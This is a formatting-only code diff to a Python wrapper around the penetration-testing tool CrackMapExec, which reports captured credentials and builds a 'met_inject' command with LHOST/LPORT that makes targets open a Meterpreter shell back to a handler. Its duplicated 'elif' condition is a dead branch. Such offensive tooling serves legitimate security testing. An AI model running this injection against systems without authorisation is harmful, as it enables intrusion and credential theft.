@@ -37,8 +37,19 @@ def report(output):
                         "description": "CrackMapExec",
                         "hostnames": [],
                         "os": operating_system[0],
-                        "credentials": [{"name": "credential", "password": credential_passw}],
-                        "services": [{"name": "CME", "port": int(port), "protocol": "TCP"}],
+                        "credentials": [
+                            {
+                                "name": "credential",
+                                "password": credential_passw,
+                            }
+                        ],
+                        "services": [
+                            {
+                                "name": "CME",
+                                "port": int(port),
+                                "protocol": "TCP",
+                            }
+                        ],
                     }
                 ]
             }
@@ -87,7 +98,8 @@ def main():
 
     else:
         print(
-            "Username or Password not provided." "Run command without parameter",
+            "Username or Password not provided."
+            "Run command without parameter",
             file=sys.stderr,
         )
         command += [
@@ -99,11 +111,18 @@ def main():
 
     if lport and lhost:
 
-        command += ["--local-auth -M met_inject -o", "LHOST=", lhost, "LPORT=", lport]
+        command += [
+            "--local-auth -M met_inject -o",
+            "LHOST=",
+            lhost,
+            "LPORT=",
+            lport,
+        ]
 
     elif lport and lhost:
         print(
-            "IP hosting the handler (LHOST) or" "Handler port (LPORT) not provided",
+            "IP hosting the handler (LHOST) or"
+            "Handler port (LPORT) not provided",
             file=sys.stderr,
         )
 
